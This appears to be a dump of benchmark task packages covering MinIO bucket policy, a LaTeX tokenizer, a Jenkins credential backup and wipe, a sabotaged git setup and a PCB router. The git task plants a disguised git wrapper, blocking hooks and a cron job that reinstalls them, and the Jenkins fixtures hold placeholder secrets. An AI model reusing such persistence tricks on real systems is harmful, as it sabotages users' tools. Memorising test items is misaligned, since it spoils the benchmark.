# MinIO server is installed but not configured yet
# The user needs to:
# 1. Start MinIO server
# 2. Create and configure a public bucket 
# 3. Set up the correct bucket policy for anonymous downloads","import subprocess
import time
import json

def test_anonymous_download_works():
    """"""Test that files can be downloaded anonymously via direct URL.""""""
    # Try to download a file without authentication
    result = subprocess.run(
        ['curl', '-s', '-o', '/dev/null', '-w', '%{http_code}', 
         'http://localhost:9000/public-bucket/test_data.txt'],
        capture_output=True, 
        text=True
    )
    
    # Should return 200 OK for successful anonymous download
    assert result.stdout.strip() == '200', f""Expected 200, got {result.stdout.strip()}""
    
    # Verify content matches
    content_result = subprocess.run(
        ['curl', '-s', 'http://localhost:9000/public-bucket/test_data.txt'],
        capture_output=True,
        text=True
    )
    assert 'This is test data' in content_result.stdout

def test_anonymous_upload_blocked():
    """"""Test that anonymous uploads are rejected.""""""
    # Try to upload without authentication
    result = subprocess.run(
        ['curl', '-s', '-X', 'PUT', '-o', '/dev/null', '-w', '%{http_code}',
         '--data', 'unauthorized content',
         'http://localhost:9000/public-bucket/illegal_upload.txt'],
        capture_output=True,
        text=True
    )
    
    # Should return 403 Forbidden
    assert result.stdout.strip() == '403', f""Expected 403, got {result.stdout.strip()}""","{""test_anonymous_download_works"": 0.6, ""test_anonymous_upload_blocked"": 0.4}","{""setup_minio.sh"": ""#!/bin/bash\n\n# Basic MinIO startup script\n# This starts MinIO but doesn't configure public access\n\nexport MINIO_ROOT_USER=minioadmin\nexport MINIO_ROOT_PASSWORD=minioadmin\n\necho \""Starting MinIO server...\""\nminio server /workspace/minio-data --console-address \"":9001\"" &\nMINIO_PID=$!\n\nsleep 5\n\necho \""MinIO server started with PID: $MINIO_PID\""\necho \""MinIO API: http://localhost:9000\""\necho \""MinIO Console: http://localhost:9001\""\n\n# Set up mc alias\nmc alias set myminio http://localhost:9000 minioadmin minioadmin\n\necho \""MinIO client configured with alias 'myminio'\"""", ""test_data.txt"": ""This is test data for the MinIO public bucket.\nIt should be downloadable without authentication.""}",2025-07-21T19:08:02.246242,2025-07-21T19:08:30.969679
draft_dp_24470e02,extremely_hard,draft_dp_24470e02,data-processing,Need to analyze the MATH dataset and count LaTeX tokens by difficulty level. The tokenizer is partially done but crashes on complex formulas. Output should go to /app/math_token_analysis.json with token counts and unique symbols for each level.,data-processing,python|data-processing|mathematics,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required packages
RUN pip install datasets transformers

# Copy the work-in-progress tokenizer
COPY math_tokenizer.py /app/
COPY test_tokenizer.py /app/

# Set up environment
ENV HF_HOME=/app/.cache/huggingface
RUN mkdir -p /app/.cache/huggingface","import os
import json

def test_output_file_structure():
    """"""Test that the output JSON file exists and has the correct structure.""""""
    assert os.path.exists('/app/math_token_analysis.json'), ""Output file not found""
    
    with open('/app/math_token_analysis.json', 'r') as f:
        data = json.load(f)
    
    # Check all difficulty levels are present
    for level in range(1, 6):
        level_key = f""level_{level}""
        assert level_key in data, f""Missing {level_key} in output""
        
        # Check required fields for each level
        assert ""problem_tokens"" in data[level_key], f""Missing problem_tokens in {level_key}""
        assert ""solution_tokens"" in data[level_key], f""Missing solution_tokens in {level_key}""
        assert ""unique_symbols"" in data[level_key], f""Missing unique_symbols in {level_key}""
        
        # Check types
        assert isinstance(data[level_key][""problem_tokens""], int), f""problem_tokens should be int in {level_key}""
        assert isinstance(data[level_key][""solution_tokens""], int), f""solution_tokens should be int in {level_key}""
        assert isinstance(data[level_key][""unique_symbols""], list), f""unique_symbols should be list in {level_key}""
    
    # Check summary exists
    assert ""summary"" in data, ""Missing summary section""
    assert ""total_tokens"" in data[""summary""], ""Missing total_tokens in summary""

def test_token_counts_reasonable():
    """"""Test that token counts are reasonable and some LaTeX symbols are found.""""""
    with open('/app/math_token_analysis.json', 'r') as f:
        data = json.load(f)
    
    # Check that we have some tokens
    total_tokens = data[""summary""][""total_tokens""]
    assert total_tokens > 1000, f""Total tokens too low: {total_tokens}""
    
    # Check that at least one level has common LaTeX symbols
    all_symbols = []
    for level in range(1, 6):
        all_symbols.extend(data[f""level_{level}""][""unique_symbols""])
    
    # Check for at least one common LaTeX command
    common_latex = ['\\int', '\\sum', '\\frac', '\\alpha', '\\beta', '\\gamma', '\\sqrt']
    found_latex = any(symbol in all_symbols for symbol in common_latex)
    assert found_latex, ""No common LaTeX symbols found in tokenization""","{""test_output_file_structure"": 0.4, ""test_token_counts_reasonable"": 0.6}","{""test_tokenizer.py"": ""from math_tokenizer import MathTokenizer\n\n# Quick test script\ntokenizer = MathTokenizer()\n\ntest_expressions = [\n    r\""\\int_0^1 x^2 dx\"",\n    r\""\\sum_{i=1}^{n} i = \\frac{n(n+1)}{2}\"",\n    r\""\\alpha + \\beta = \\gamma\""\n]\n\nprint(\""Testing tokenizer on sample expressions:\"")\nfor expr in test_expressions:\n    tokens = tokenizer.tokenize(expr)\n    print(f\""\\nExpression: {expr}\"")\n    print(f\""Tokens: {tokens}\"")\n    print(f\""Token count: {len(tokens)}\"")"", ""math_tokenizer.py"": ""import re\nimport json\nfrom collections import defaultdict\nfrom datasets import load_dataset\n\nclass MathTokenizer:\n    def __init__(self):\n        # Basic LaTeX command patterns\n        self.latex_commands = re.compile(r'\\\\[a-zA-Z]+')\n        self.operators = re.compile(r'[+\\-*/=<>\u2264\u2265\u2260\u2208\u2209\u2282\u2283\u2286\u2287\u222a\u2229]')\n        self.numbers = re.compile(r'\\d+\\.?\\d*')\n        self.variables = re.compile(r'[a-zA-Z]')\n        \n    def tokenize(self, text):\n        \""\""\""Tokenize LaTeX mathematical expression\""\""\""\n        tokens = []\n        \n        # Extract LaTeX commands first\n        commands = self.latex_commands.findall(text)\n        tokens.extend(commands)\n        \n        # Remove LaTeX commands for further processing\n        text_no_commands = self.latex_commands.sub(' ', text)\n        \n        # Extract operators\n        ops = self.operators.findall(text_no_commands)\n        tokens.extend(ops)\n        \n        # Extract numbers\n        nums = self.numbers.findall(text_no_commands)\n        tokens.extend(nums)\n        \n        # Extract variables (single letters not part of commands)\n        text_no_ops_nums = self.operators.sub(' ', text_no_commands)\n        text_no_ops_nums = self.numbers.sub(' ', text_no_ops_nums)\n        vars = self.variables.findall(text_no_ops_nums)\n        tokens.extend(vars)\n        \n        return tokens\n\ndef main():\n    print(\""Loading MATH dataset...\"")\n    dataset = load_dataset(\""lighteval/MATH\"", split=\""train\"")\n    \n    tokenizer = MathTokenizer()\n    results = {}\n    \n    # Process by difficulty level\n    for level in range(1, 6):\n        level_key = f\""level_{level}\""\n        results[level_key] = {\n            \""problem_tokens\"": 0,\n            \""solution_tokens\"": 0,\n            \""unique_symbols\"": set()\n        }\n        \n        # Filter data by level\n        level_data = [item for item in dataset if item['level'] == f\""Level {level}\""]\n        \n        print(f\""Processing Level {level} ({len(level_data)} problems)...\"")\n        \n        for item in level_data[:100]:  # Process first 100 for now\n            # Tokenize problem\n            problem_tokens = tokenizer.tokenize(item['problem'])\n            results[level_key][\""problem_tokens\""] += len(problem_tokens)\n            results[level_key][\""unique_symbols\""].update(problem_tokens)\n            \n            # This is buggy - crashes on complex formulas\n            try:\n                solution_tokens = tokenizer.tokenize(item['solution'])\n                results[level_key][\""solution_tokens\""] += len(solution_tokens)\n                results[level_key][\""unique_symbols\""].update(solution_tokens)\n            except:\n                # TODO: Fix tokenizer for complex expressions\n                pass\n    \n    # Convert sets to lists for JSON serialization\n    for level_key in results:\n        results[level_key][\""unique_symbols\""] = list(results[level_key][\""unique_symbols\""])\n    \n    # Add summary\n    results[\""summary\""] = {\n        \""total_tokens\"": sum(results[f\""level_{i}\""][\""problem_tokens\""] + \n                          results[f\""level_{i}\""][\""solution_tokens\""] \n                          for i in range(1, 6)),\n        \""avg_tokens_per_level\"": {\n            f\""level_{i}\"": (results[f\""level_{i}\""][\""problem_tokens\""] + \n                         results[f\""level_{i}\""][\""solution_tokens\""]) / \n                         max(1, len([item for item in dataset if item['level'] == f\""Level {i}\""][:100]))\n            for i in range(1, 6)\n        }\n    }\n    \n    # Save results\n    with open('/app/math_token_analysis.json', 'w') as f:\n        json.dump(results, f, indent=2)\n    \n    print(\""Analysis complete! Results saved to /app/math_token_analysis.json\"")\n\nif __name__ == \""__main__\"":\n    main()""}",2025-07-21T19:11:43.864732,2025-07-21T19:11:43.864732
draft_dp_780bfaff,hard,draft_dp_780bfaff,system-administration,"We're decommissioning Jenkins. Export all credentials to an encrypted backup at /secure/jenkins_credentials_backup.tar.gz.gpg (passphrase: jenkins-secrets-migration), then securely wipe all credential files from the system.",system-administration,security|automation|encryption,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install required packages
RUN apt-get update && apt-get install -y \
    openjdk-11-jre-headless \
    python3 \
    python3-pip \
    python3-venv \
    gnupg \
    coreutils \
    tar \
    curl \
    jq \
    && rm -rf /var/lib/apt/lists/*

# Install pytest system-wide
RUN pip3 install --break-system-packages pytest

# Set up Jenkins home directory
ENV JENKINS_HOME=/var/jenkins_home
RUN mkdir -p $JENKINS_HOME/secrets $JENKINS_HOME/jobs /secure

# Copy Jenkins configuration and credentials
COPY credentials.xml $JENKINS_HOME/
COPY secret.key $JENKINS_HOME/
COPY secrets/master.key $JENKINS_HOME/secrets/
COPY jobs/ $JENKINS_HOME/jobs/

# Copy mock Jenkins CLI
COPY mock-jenkins-cli.py /usr/local/bin/jenkins-cli
RUN chmod +x /usr/local/bin/jenkins-cli

# Create workspace directories with some leftover secret files
RUN mkdir -p $JENKINS_HOME/workspace/deploy-app/.ssh \
    $JENKINS_HOME/workspace/api-integration/.credentials
RUN echo ""leftover-api-key-12345"" > $JENKINS_HOME/workspace/api-integration/.credentials/api.key
RUN echo ""ssh-rsa AAAAB3NzaC1yc2EA... deploy@jenkins"" > $JENKINS_HOME/workspace/deploy-app/.ssh/id_rsa.pub

# Set proper permissions
RUN chmod 600 $JENKINS_HOME/secret.key $JENKINS_HOME/secrets/master.key
RUN chmod 644 $JENKINS_HOME/credentials.xml

# Create a mock Jenkins token file
RUN echo ""jenkins_admin_token_2024"" > /root/.jenkins-cli-token

WORKDIR /root","import os
import subprocess
import json
import tempfile

def test_encrypted_backup_exists_and_valid():
    """"""Test that the encrypted backup exists and can be decrypted with correct passphrase""""""
    backup_path = ""/secure/jenkins_credentials_backup.tar.gz.gpg""
    
    # Check encrypted file exists
    assert os.path.exists(backup_path), f""Encrypted backup not found at {backup_path}""
    
    # Try to decrypt with correct passphrase
    with tempfile.TemporaryDirectory() as tmpdir:
        decrypt_cmd = [
            ""gpg"", ""--batch"", ""--yes"", ""--passphrase"", ""jenkins-secrets-migration"",
            ""--decrypt"", backup_path
        ]
        result = subprocess.run(decrypt_cmd, capture_output=True, cwd=tmpdir)
        assert result.returncode == 0, f""Failed to decrypt backup: {result.stderr.decode()}""
        
        # Extract the decrypted tar
        extract_cmd = [""tar"", ""-xzf"", ""-""]
        extract_result = subprocess.run(extract_cmd, input=result.stdout, capture_output=True, cwd=tmpdir)
        assert extract_result.returncode == 0, f""Failed to extract tar: {extract_result.stderr.decode()}""
        
        # Verify key files exist in archive
        assert os.path.exists(os.path.join(tmpdir, ""credentials.xml"")), ""credentials.xml not in backup""
        assert os.path.exists(os.path.join(tmpdir, ""secret.key"")), ""secret.key not in backup""
        
        # Verify credentials JSON exists and is valid
        creds_files = [f for f in os.listdir(tmpdir) if f.endswith('.json')]
        assert len(creds_files) > 0, ""No credentials JSON files found in backup""
        
        # Verify at least one credential JSON is valid
        for cred_file in creds_files:
            with open(os.path.join(tmpdir, cred_file), 'r') as f:
                data = json.load(f)
                assert isinstance(data, (dict, list)), f""Invalid JSON in {cred_file}""

def test_jenkins_credential_files_removed():
    """"""Test that all Jenkins credential files have been securely removed""""""
    jenkins_home = ""/var/jenkins_home""
    
    # Check main credential files are gone
    assert not os.path.exists(os.path.join(jenkins_home, ""credentials.xml"")), ""credentials.xml still exists""
    assert not os.path.exists(os.path.join(jenkins_home, ""secret.key"")), ""secret.key still exists""
    assert not os.path.exists(os.path.join(jenkins_home, ""secrets"")), ""secrets directory still exists""
    
    # Check workspace directories are cleaned
    workspace_dir = os.path.join(jenkins_home, ""workspace"")
    if os.path.exists(workspace_dir):
        for root, dirs, files in os.walk(workspace_dir):
            for file in files:
                filepath = os.path.join(root, file)
                # Check no credential-like files remain
                assert not file.endswith(('.key', '.pem', '.p12')), f""Key file still exists: {filepath}""
                assert 'credential' not in file.lower(), f""Credential file still exists: {filepath}""
                assert 'secret' not in file.lower(), f""Secret file still exists: {filepath}""
    
    # Verify Jenkins CLI shows no credentials
    result = subprocess.run([""jenkins-cli"", ""list-credentials""], capture_output=True, text=True)
    if result.returncode == 0:
        try:
            creds = json.loads(result.stdout)
            assert len(creds) == 0, f""Jenkins still has {len(creds)} credentials""
        except:
            # If output is not JSON, check it indicates no credentials
            assert ""no credentials"" in result.stdout.lower() or result.stdout.strip() == ""[]""","{""test_encrypted_backup_exists_and_valid"": 0.6, ""test_jenkins_credential_files_removed"": 0.4}","{""jenkins-cli.jar"": ""# This is a placeholder for jenkins-cli.jar\n# In the actual environment, this would be the Jenkins CLI JAR file\n# For testing purposes, we'll simulate it with a script"", ""credentials.xml"": ""<?xml version='1.1' encoding='UTF-8'?>\n<com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin=\""credentials@2.6.1\"">\n  <domainCredentialsMap class=\""hudson.util.CopyOnWriteMap$Hash\"">\n    <entry>\n      <com.cloudbees.plugins.credentials.domains.Domain>\n        <specifications/>\n      </com.cloudbees.plugins.credentials.domains.Domain>\n      <java.util.concurrent.CopyOnWriteArrayList>\n        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>\n          <scope>GLOBAL</scope>\n          <id>deploy-user-prod</id>\n          <description>Production deployment credentials</description>\n          <username>deploy_user</username>\n          <password>{AQAAABAAAAAwKP2L1kOlTcCYfH+fF4qE3p9N4m+fF4qE3p9N4m+deployment-secret-password-2024}</password>\n        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>\n        <com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey>\n          <scope>GLOBAL</scope>\n          <id>github-deploy-key</id>\n          <description>GitHub deployment SSH key</description>\n          <username>git</username>\n          <privateKeySource class=\""com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey$DirectEntryPrivateKeySource\"">\n            <privateKey>{AQAAABAAAAAwKP2L1kOlTcCYfH+ssh-rsa-key-encrypted-content}</privateKey>\n          </privateKeySource>\n        </com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey>\n        <org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl>\n          <scope>GLOBAL</scope>\n          <id>api-token-external</id>\n          <description>External API token</description>\n          <secret>{AQAAABAAAAAwKP2L1kOlTcCYfH+api-secret-token-production-2024}</secret>\n        </org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl>\n      </java.util.concurrent.CopyOnWriteArrayList>\n    </entry>\n  </domainCredentialsMap>\n</com.cloudbees.plugins.credentials.SystemCredentialsProvider>"", ""mock-jenkins-cli.py"": ""#!/usr/bin/env python3\nimport sys\nimport json\nimport os\n\ndef list_credentials():\n    credentials = [\n        {\n            \""id\"": \""deploy-user-prod\"",\n            \""type\"": \""UsernamePassword\"",\n            \""description\"": \""Production deployment credentials\"",\n            \""username\"": \""deploy_user\""\n        },\n        {\n            \""id\"": \""github-deploy-key\"", \n            \""type\"": \""SSHUserPrivateKey\"",\n            \""description\"": \""GitHub deployment SSH key\"",\n            \""username\"": \""git\""\n        },\n        {\n            \""id\"": \""api-token-external\"",\n            \""type\"": \""StringCredentials\"",\n            \""description\"": \""External API token\""\n        }\n    ]\n    print(json.dumps(credentials, indent=2))\n\ndef export_credential(cred_id):\n    credentials = {\n        \""deploy-user-prod\"": {\n            \""id\"": \""deploy-user-prod\"",\n            \""type\"": \""UsernamePassword\"",\n            \""username\"": \""deploy_user\"",\n            \""password\"": \""deployment-secret-password-2024\""\n        },\n        \""github-deploy-key\"": {\n            \""id\"": \""github-deploy-key\"",\n            \""type\"": \""SSHUserPrivateKey\"",\n            \""username\"": \""git\"",\n            \""privateKey\"": \""-----BEGIN RSA PRIVATE KEY-----\\nMIIEpAIBAAKCAQEA...\\n-----END RSA PRIVATE KEY-----\""\n        },\n        \""api-token-external\"": {\n            \""id\"": \""api-token-external\"",\n            \""type\"": \""StringCredentials\"",\n            \""secret\"": \""api-secret-token-production-2024\""\n        }\n    }\n    if cred_id in credentials:\n        print(json.dumps(credentials[cred_id], indent=2))\n\nif __name__ == \""__main__\"":\n    if len(sys.argv) > 1 and sys.argv[1] == \""list-credentials\"":\n        list_credentials()\n    elif len(sys.argv) > 2 and sys.argv[1] == \""export-credential\"":\n        export_credential(sys.argv[2])"", ""secret.key"": ""a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8"", ""secrets/master.key"": ""9f8e7d6c5b4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7"", ""jobs/deploy-app/config.xml"": ""<?xml version='1.1' encoding='UTF-8'?>\n<project>\n  <description>Production deployment job</description>\n  <builders>\n    <hudson.tasks.Shell>\n      <command>echo \""Deploying to production\""</command>\n    </hudson.tasks.Shell>\n  </builders>\n  <publishers/>\n  <buildWrappers>\n    <org.jenkinsci.plugins.credentialsbinding.impl.SecretBuildWrapper>\n      <bindings>\n        <org.jenkinsci.plugins.credentialsbinding.impl.UsernamePasswordBinding>\n          <credentialsId>deploy-user-prod</credentialsId>\n          <usernameVariable>DEPLOY_USER</usernameVariable>\n          <passwordVariable>DEPLOY_PASS</passwordVariable>\n        </org.jenkinsci.plugins.credentialsbinding.impl.UsernamePasswordBinding>\n      </bindings>\n    </org.jenkinsci.plugins.credentialsbinding.impl.SecretBuildWrapper>\n  </buildWrappers>\n</project>""}",2025-07-21T19:09:10.686928,2025-07-21T19:10:46.904370
draft_dp_db9b78ec,hard,draft_dp_db9b78ec,system-administration,"Git commands keep failing across all our repos - commits fail, pushes blocked, pulls error out. Even after reinstalling git, problems come back after a few minutes. Need this fixed ASAP so the team can work.",system-administration,git|troubleshooting|sys-admin,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install git and cron
RUN apt-get update && apt-get install -y git cron && apt-get clean

# Create developer user and directories
RUN useradd -m -s /bin/bash developer && \
    mkdir -p /home/developer/scripts && \
    mkdir -p /home/developer/projects/webapp && \
    mkdir -p /home/developer/projects/api && \
    mkdir -p /home/developer/projects/frontend && \
    mkdir -p /home/developer/.backup

# Copy system files to backup location
COPY sys_util.sh /home/developer/.backup/
COPY rc_additions /home/developer/.backup/
COPY config.global /home/developer/.backup/
COPY maintenance.sh /home/developer/.backup/
COPY hook_template /home/developer/.backup/

# Set up system utilities
COPY sys_util.sh /home/developer/scripts/
COPY config.global /home/developer/.config.global
RUN chmod +x /home/developer/scripts/sys_util.sh && \
    chmod +x /home/developer/.backup/maintenance.sh && \
    chmod +x /home/developer/.backup/sys_util.sh

# Add system configurations to bashrc
RUN cat /home/developer/.backup/rc_additions >> /home/developer/.bashrc

# Initialize git repos with some history
RUN cd /home/developer/projects/webapp && \
    git init && \
    echo ""# Web Application"" > README.md && \
    git add README.md && \
    git -c user.name=""Dev"" -c user.email=""dev@example.com"" commit -m ""Initial commit"" && \
    cd /home/developer/projects/api && \
    git init && \
    echo ""# API Service"" > README.md && \
    git add README.md && \
    git -c user.name=""Dev"" -c user.email=""dev@example.com"" commit -m ""Initial commit"" && \
    cd /home/developer/projects/frontend && \
    git init && \
    echo ""# Frontend App"" > README.md && \
    git add README.md && \
    git -c user.name=""Dev"" -c user.email=""dev@example.com"" commit -m ""Initial commit""

# Copy sample work files
COPY test_file.py /home/developer/projects/webapp/
COPY test_file.py /home/developer/projects/api/app.py

# Install git hooks in all repos
RUN for repo in /home/developer/projects/*/.git; do \
        if [ -d ""$repo/hooks"" ]; then \
            cp /home/developer/.backup/hook_template ""$repo/hooks/pre-commit"" && \
            cp /home/developer/.backup/hook_template ""$repo/hooks/pre-push"" && \
            chmod +x ""$repo/hooks/pre-commit"" && \
            chmod +x ""$repo/hooks/pre-push""; \
        fi \
    done

# Set up periodic maintenance job
RUN echo ""*/2 * * * * /home/developer/.backup/maintenance.sh >/dev/null 2>&1"" | crontab -u developer -

# Fix ownership
RUN chown -R developer:developer /home/developer

# Start cron service
RUN service cron start

# Set working directory but stay as root for now
WORKDIR /home/developer

# Note: Not switching to developer user here to allow test execution as root
CMD [""/bin/bash""]","import subprocess
import os
import tempfile
import shutil

def test_git_operations_work():
    """"""Test that basic git operations (init, add, commit) work properly.""""""
    # Create a temporary directory for testing
    test_dir = tempfile.mkdtemp(dir=""/home/developer"")
    
    try:
        # Test git init
        result = subprocess.run(
            [""git"", ""init""],
            cwd=test_dir,
            capture_output=True,
            text=True
        )
        assert result.returncode == 0, f""git init failed: {result.stderr}""
        assert os.path.exists(os.path.join(test_dir, "".git"")), "".git directory not created""
        
        # Create a test file
        test_file = os.path.join(test_dir, ""test.txt"")
        with open(test_file, ""w"") as f:
            f.write(""test content"")
        
        # Test git add
        result = subprocess.run(
            [""git"", ""add"", ""test.txt""],
            cwd=test_dir,
            capture_output=True,
            text=True
        )
        assert result.returncode == 0, f""git add failed: {result.stderr}""
        
        # Test git commit
        result = subprocess.run(
            [""git"", ""-c"", ""user.name=Test"", ""-c"", ""user.email=test@example.com"", 
             ""commit"", ""-m"", ""Test commit""],
            cwd=test_dir,
            capture_output=True,
            text=True
        )
        assert result.returncode == 0, f""git commit failed: {result.stderr}""
        
    finally:
        # Clean up
        if os.path.exists(test_dir):
            shutil.rmtree(test_dir)

def test_existing_repos_can_commit():
    """"""Test that existing repositories can perform commits without hook interference.""""""
    # Test in the webapp project
    test_file = ""/home/developer/projects/webapp/new_feature.py""
    
    # Create a new file
    with open(test_file, ""w"") as f:
        f.write(""def new_feature():\n    return 'working'\n"")
    
    # Try to add and commit
    result = subprocess.run(
        [""git"", ""add"", ""new_feature.py""],
        cwd=""/home/developer/projects/webapp"",
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, f""git add in existing repo failed: {result.stderr}""
    
    result = subprocess.run(
        [""git"", ""-c"", ""user.name=Developer"", ""-c"", ""user.email=dev@example.com"",
         ""commit"", ""-m"", ""Add new feature""],
        cwd=""/home/developer/projects/webapp"",
        capture_output=True,
        text=True
    )
    assert result.returncode == 0, f""git commit in existing repo failed: {result.stderr}""
    
    # Verify the commit was created
    result = subprocess.run(
        [""git"", ""log"", ""--oneline"", ""-1""],
        cwd=""/home/developer/projects/webapp"",
        capture_output=True,
        text=True
    )
    assert ""Add new feature"" in result.stdout, ""Commit message not found in git log""","{""test_git_operations_work"": 0.5, ""test_existing_repos_can_commit"": 0.5}","{""sys_util.sh"": ""#!/bin/bash\n# System utility script for command processing\n\ncase \""$1\"" in\n    \""init\"")\n        echo \""error: Failed to initialize repository\"" >&2\n        exit 1\n        ;;\n    \""add\"")\n        echo \""fatal: pathspec '$2' did not match any files\"" >&2\n        exit 128\n        ;;\n    \""commit\"")\n        echo \""error: unable to write new index file\"" >&2\n        exit 1\n        ;;\n    \""push\"")\n        echo \""error: failed to push some refs\"" >&2\n        echo \""error: permission denied\"" >&2\n        exit 1\n        ;;\n    \""pull\"")\n        echo \""fatal: unable to access repository\"" >&2\n        exit 128\n        ;;\n    \""clone\"")\n        echo \""fatal: repository not found\"" >&2\n        exit 128\n        ;;\n    *)\n        /usr/bin/git \""$@\""\n        ;;\nesac"", ""config.global"": ""[core]\n    editor = /bin/false\n    pager = /bin/false\n[alias]\n    init = \""!echo 'error: git init disabled' && exit 1\""\n    commit = \""!echo 'error: git commit disabled' && exit 1\""\n[user]\n    name = CORRUPTED\n    email = invalid@nowhere"", ""hook_template"": ""#!/bin/bash\necho \""error: commit blocked by security policy\"" >&2\nexit 1"", ""test_file.py"": ""def main():\n    print(\""Hello from test project\"")\n    return 0\n\nif __name__ == \""__main__\"":\n    main()"", ""rc_additions"": ""# System utility aliases\nalias git='/home/developer/scripts/sys_util.sh'\nalias g='/home/developer/scripts/sys_util.sh'\nexport GIT_CONFIG_GLOBAL=/home/developer/.config.global"", ""maintenance.sh"": ""#!/bin/bash\n# System maintenance script\n\n# Ensure system utilities are in place\ncp /home/developer/.backup/sys_util.sh /home/developer/scripts/sys_util.sh 2>/dev/null\nchmod +x /home/developer/scripts/sys_util.sh 2>/dev/null\n\n# Ensure aliases are in bashrc\nif ! grep -q \""alias git='/home/developer/scripts/sys_util.sh'\"" /home/developer/.bashrc; then\n    cat /home/developer/.backup/rc_additions >> /home/developer/.bashrc\nfi\n\n# Ensure global config is applied\ncp /home/developer/.backup/config.global /home/developer/.config.global 2>/dev/null\n\n# Install git hooks in all repos\nfor repo in /home/developer/projects/*/.git; do\n    if [ -d \""$repo/hooks\"" ]; then\n        echo '#!/bin/bash' > \""$repo/hooks/pre-commit\""\n        echo 'echo \""error: commit blocked by security policy\"" >&2' >> \""$repo/hooks/pre-commit\""\n        echo 'exit 1' >> \""$repo/hooks/pre-commit\""\n        chmod +x \""$repo/hooks/pre-commit\""\n        \n        cp \""$repo/hooks/pre-commit\"" \""$repo/hooks/pre-push\"" 2>/dev/null\n    fi\ndone""}",2025-07-21T19:06:57.972536,2025-07-22T15:31:55.210235+00:00
draft_dp_9aed60b0,extremely_hard,draft_dp_9aed60b0,software-engineering,The PCB router is taking forever on our 50-component board. Need a genetic algorithm approach that finds decent routes in under 30 seconds - focus on minimizing wire crossings and total trace length.,software-engineering,python|algorithm-implementation|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install required Python packages
RUN pip install numpy networkx matplotlib

# Copy project files
COPY pcb_router.py /app/
COPY board_50_components.json /app/
COPY simple_test_board.json /app/
COPY router_config.json /app/

# Create output directory
RUN mkdir -p /app/output

CMD [""bash""]","import os
import json
import subprocess
import time

def test_genetic_router_performance():
    """"""Test that genetic algorithm router completes 50-component board under 30 seconds""""""
    # Run the genetic router
    start_time = time.time()
    result = subprocess.run(
        ['python', '/app/pcb_router.py'],
        capture_output=True,
        text=True,
        timeout=35
    )
    runtime = time.time() - start_time
    
    # Check it completed successfully
    assert result.returncode == 0, f""Router failed with: {result.stderr}""
    
    # Check runtime is under 30 seconds
    assert runtime < 30, f""Router took {runtime:.1f}s, exceeding 30s limit""
    
    # Verify output file was created
    assert os.path.exists('/app/output/routing_solution.json'), ""No routing solution generated""
    
def test_routing_quality():
    """"""Test that routing minimizes crossings and produces reasonable wire length""""""
    # Load the routing solution
    with open('/app/output/routing_solution.json', 'r') as f:
        solution = json.load(f)
    
    metrics = solution['metrics']
    
    # Check all nets were routed
    assert metrics['routed_nets'] == metrics['net_count'], ""Not all nets were routed""
    
    # Check crossings are minimized (genetic should do better than naive)
    # For 35 nets on 50 components, expect genetic algorithm to achieve < 100 crossings
    assert metrics['crossing_count'] < 100, f""Too many crossings: {metrics['crossing_count']}""
    
    # Check wire length is reasonable (in mm)
    # For this board size and complexity, total length should be < 5000mm
    assert metrics['total_wire_length'] < 5000, f""Wire length too high: {metrics['total_wire_length']}mm""","{""test_genetic_router_performance"": 0.3, ""test_routing_quality"": 0.7}","{""board_50_components.json"": ""{\n  \""board\"": {\n    \""width\"": 100,\n    \""height\"": 100\n  },\n  \""components\"": [\n    {\""id\"": \""U1\"", \""x\"": 10, \""y\"": 10, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""U2\"", \""x\"": 30, \""y\"": 10, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""U3\"", \""x\"": 50, \""y\"": 10, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""U4\"", \""x\"": 70, \""y\"": 10, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""U5\"", \""x\"": 10, \""y\"": 25, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""U6\"", \""x\"": 30, \""y\"": 25, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""U7\"", \""x\"": 50, \""y\"": 25, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""U8\"", \""x\"": 70, \""y\"": 25, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""U9\"", \""x\"": 10, \""y\"": 40, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""U10\"", \""x\"": 30, \""y\"": 40, \""pins\"": {\""1\"": [0, 0], \""2\"": [2.54, 0], \""3\"": [5.08, 0], \""4\"": [7.62, 0]}},\n    {\""id\"": \""R1\"", \""x\"": 15, \""y\"": 55, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": \""R2\"", \""x\"": 25, \""y\"": 55, \""pins\"": {\""1\"": [0, 0], \""2\"": [5, 0]}},\n    {\""id\"": 